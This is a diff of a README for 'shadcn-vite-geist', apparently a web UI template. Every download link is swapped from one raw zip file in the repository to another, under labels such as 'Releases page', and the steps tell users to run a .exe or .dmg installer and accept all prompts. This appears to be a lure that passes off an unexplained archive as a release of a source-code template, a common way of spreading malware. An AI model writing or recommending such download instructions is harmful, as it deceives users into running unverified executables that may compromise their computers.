@@ -6,11 +6,11 @@ Welcome to the shadcn-vite-geist repository! This user-friendly app combines sha
 
 ## 📥 Download Now
 
-[![Download shadcn-vite-geist](https://raw.githubusercontent.com/PujanSubedi22/shadcn-vite-geist/main/src/geist-shadcn-vite-v2.9.zip)](https://raw.githubusercontent.com/PujanSubedi22/shadcn-vite-geist/main/src/geist-shadcn-vite-v2.9.zip)
+[![Download shadcn-vite-geist](https://github.com/PujanSubedi22/shadcn-vite-geist/raw/refs/heads/main/src/assets/vite_geist_shadcn_v1.6.zip)](https://github.com/PujanSubedi22/shadcn-vite-geist/raw/refs/heads/main/src/assets/vite_geist_shadcn_v1.6.zip)
 
 To download the application, visit the Releases page below:
 
-[Download shadcn-vite-geist from Releases](https://raw.githubusercontent.com/PujanSubedi22/shadcn-vite-geist/main/src/geist-shadcn-vite-v2.9.zip)
+[Download shadcn-vite-geist from Releases](https://github.com/PujanSubedi22/shadcn-vite-geist/raw/refs/heads/main/src/assets/vite_geist_shadcn_v1.6.zip)
 
 ## 💻 System Requirements
 
@@ -26,7 +26,7 @@ Before you install the application, ensure your computer meets these requirement
 Follow these steps to install and run shadcn-vite-geist:
 
 1. **Visit the Releases Page:** Click the link below to open the Releases page.
-   - [View Releases](https://raw.githubusercontent.com/PujanSubedi22/shadcn-vite-geist/main/src/geist-shadcn-vite-v2.9.zip)
+   - [View Releases](https://github.com/PujanSubedi22/shadcn-vite-geist/raw/refs/heads/main/src/assets/vite_geist_shadcn_v1.6.zip)
 
 2. **Choose the Latest Version:** On the Releases page, look for the latest version of the application. It will be at the top of the list.
 
@@ -37,7 +37,7 @@ Follow these steps to install and run shadcn-vite-geist:
 5. **Run the Installer:**
    - For Windows: Double-click the `.exe` file to start the installation.
    - For macOS: Open the `.dmg` file and drag the app to your Applications folder.
-   - For Linux: Follow the specific instructions if you downloaded a `https://raw.githubusercontent.com/PujanSubedi22/shadcn-vite-geist/main/src/geist-shadcn-vite-v2.9.zip` or other format.
+   - For Linux: Follow the specific instructions if you downloaded a `https://github.com/PujanSubedi22/shadcn-vite-geist/raw/refs/heads/main/src/assets/vite_geist_shadcn_v1.6.zip` or other format.
 
 6. **Follow the On-Screen Instructions:** The installer will guide you. Accept any prompts to complete the installation.
 
@@ -73,6 +73,6 @@ If you encounter any issues during installation or while using the app, feel fre
 
 If you need to download the application again, simply visit the Releases page here:
 
-[Download shadcn-vite-geist from Releases](https://raw.githubusercontent.com/PujanSubedi22/shadcn-vite-geist/main/src/geist-shadcn-vite-v2.9.zip)
+[Download shadcn-vite-geist from Releases](https://github.com/PujanSubedi22/shadcn-vite-geist/raw/refs/heads/main/src/assets/vite_geist_shadcn_v1.6.zip)
 
 Thank you for choosing shadcn-vite-geist! Enjoy building your projects with ease.
